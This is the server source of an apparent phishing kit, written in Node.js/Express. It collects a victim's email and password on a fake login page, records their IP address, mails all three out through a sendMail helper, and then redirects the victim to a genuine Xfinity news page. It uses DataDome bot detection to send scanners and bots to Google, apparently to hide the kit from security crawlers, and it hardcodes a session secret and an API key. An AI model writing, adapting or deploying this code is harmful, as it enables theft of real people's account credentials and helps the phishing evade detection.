const PORT = 5000;
const express = require('express');
const session = require('express-session');
const path = require('path');
const cors = require('cors');
const DataDome = require('@datadome/node-module');
const sendMail = require('./mail');
const beautify = require('js-beautify').html;
const ejs = require('ejs');
const axios = require('axios');

const app = express();

app.set('view engine', 'ejs');
app.use(express.static('views'));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(cors());

app.use(session({
  secret: 'thisispersonel',
  resave: false,
  saveUninitialized: true,
}));

app.use((req, res, next) => {
  // Middleware to store the visitor's IP
  req.visitorIP = req.ip;
  next();
});

const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
  .on('blocked', (req, res) => {
    console.log('request blocked');
    res.redirect('https://www.google.com');
  })
  .on('valid', (req, res) => {
    console.log('request allowed');
    ejs.renderFile(path.join(__dirname, 'views', 'index.ejs'), {}, (err, str) => {
      if (err) {
        console.error('EJS render error:', err);
        res.status(500).json({ message: 'Internal error', err });
      } else {
        const obfuscatedHTML = beautify(str, { /* obfuscation options */ });
        res.send(obfuscatedHTML);
      }
    });
  });

app.post('/loginPage', (req, res) => {
  const userInput = req.body.user;
  req.session.userInput = userInput;
  res.redirect('/loginPage');
});

app.get('/loginPage', async (req, res) => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    const visitorIP = response.data.ip;

    // Store visitorIP in the session
    req.session.visitorIP = visitorIP;

    // Retrieve userInput from the session
    const userInput = req.session.userInput;

    // Render your loginPage.ejs passing visitorIP and userInput
    res.render('loginPage.ejs', { visitorIP, userInput });
  } catch (error) {
    console.error('Error getting IP:', error);
    res.status(500).send('Error getting IP');
  }
});

app.post('/email', (req, res) => {
  const { passwd } = req.body;
  const email = req.session.userInput;
  const visitorIP = req.session.visitorIP;

  // Assuming your sendMail function requires email, password, and IP address
  sendMail(email, passwd, visitorIP, (err, data) => {
    if (err) {
      res.status(500).json({ message: 'internal error', err });
    } else {
      res.redirect('https://www.xfinity.com/hub/news'); // Redirect after sending email
    }
  });
});

app.get('/', (req, res) => {
  // Use DataDome for bot detection and protection
  datadomeClient.auth(req, res);
});

app.listen(PORT, () => console.log('server running'));
